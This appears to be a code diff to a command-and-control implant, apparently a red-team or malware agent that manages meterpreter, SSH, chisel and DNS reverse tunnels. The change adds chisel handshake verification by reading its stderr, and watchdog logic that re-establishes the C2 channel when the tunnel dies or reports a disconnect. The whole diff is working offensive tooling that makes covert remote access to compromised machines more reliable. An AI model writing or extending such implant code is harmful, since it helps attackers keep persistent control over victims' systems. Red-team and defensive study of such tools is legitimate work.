@@ -50,6 +50,7 @@ _pty_child_pid = None          # Tracked so signal handler can kill it
 _meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch threads
 _ssh_tunnel_proc = None        # SSH reverse tunnel subprocess
 _chisel_proc = None            # Chisel HTTPS reverse tunnel subprocess
+_chisel_stderr_lines = []      # Ongoing stderr capture for health checks
 _watchdog_stop = threading.Event()
 _exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
@@ -404,17 +405,52 @@ def try_chisel(config):
             stderr=subprocess.PIPE,
         )
 
-        # Give chisel time to connect or fail fast
-        time.sleep(3)
+        # Read stderr in a background thread — chisel logs connection
+        # status there.  We need "Connected" to confirm the handshake
+        # with an actual chisel server (not nginx/Apache on 443).
+        _chisel_stderr_lines.clear()
+
+        def _drain_stderr():
+            try:
+                for raw in proc.stderr:
+                    line = raw.decode(errors="replace").strip()
+                    if line:
+                        _chisel_stderr_lines.append(line)
+                        log.debug("chisel stderr: %s", line)
+            except Exception:
+                pass
+
+        t = threading.Thread(target=_drain_stderr, daemon=True)
+        t.start()
+
+        # Wait up to 15s for chisel to report "Connected"
+        connected = False
+        for _ in range(15):
+            time.sleep(1)
+            if proc.poll() is not None:
+                break
+            for line in _chisel_stderr_lines:
+                if "Connected" in line:
+                    connected = True
+                    break
+            if connected:
+                break
 
         if proc.poll() is not None:
             rc = proc.returncode
-            err = ""
+            err = "\n".join(_chisel_stderr_lines)
+            log.error("Chisel exited (rc=%d): %s", rc, err[:500])
+            return False
+
+        if not connected:
+            err = "\n".join(_chisel_stderr_lines)
+            log.error("Chisel: no handshake after 15s (wrong server on :%d?): %s",
+                       server_port, err[:500])
+            proc.terminate()
             try:
-                err = proc.stderr.read().decode(errors="replace").strip()
+                proc.wait(timeout=3)
             except Exception:
-                pass
-            log.error("Chisel exited immediately (rc=%d): %s", rc, err[:500])
+                proc.kill()
             return False
 
         _chisel_proc = proc
@@ -1305,8 +1341,24 @@ def _watchdog_loop(config, on_reconnect):
         # Check if C2 is still alive.
         # Meterpreter and reverse_shell: the blocking call (exec/pty.spawn)
         # sets _current_state=FAILED on return — the main loop detects it
-        # directly, so the watchdog only needs to cover dns_tunnel here.
-        if _c2_method == "dns_tunnel" and not _dns_tunnel_up():
+        # directly, so the watchdog covers chisel and dns_tunnel.
+        if _c2_method == "chisel" and not chisel_is_alive():
+            log.warning("Chisel process died — re-establishing C2")
+            _stop_chisel()
+            _attempt_reconnect(config, on_reconnect, retry_interval,
+                              max_retries, backoff, retries)
+
+        elif _c2_method == "chisel" and _chisel_stderr_lines:
+            # Check for disconnect/error messages in ongoing stderr
+            for line in list(_chisel_stderr_lines):
+                if "Disconnected" in line or "Give up" in line:
+                    log.warning("Chisel reports disconnect: %s", line)
+                    _stop_chisel()
+                    _attempt_reconnect(config, on_reconnect, retry_interval,
+                                      max_retries, backoff, retries)
+                    break
+
+        elif _c2_method == "dns_tunnel" and not _dns_tunnel_up():
             log.warning("DNS tunnel dropped — re-establishing C2")
             _attempt_reconnect(config, on_reconnect, retry_interval,
                               max_retries, backoff, retries)
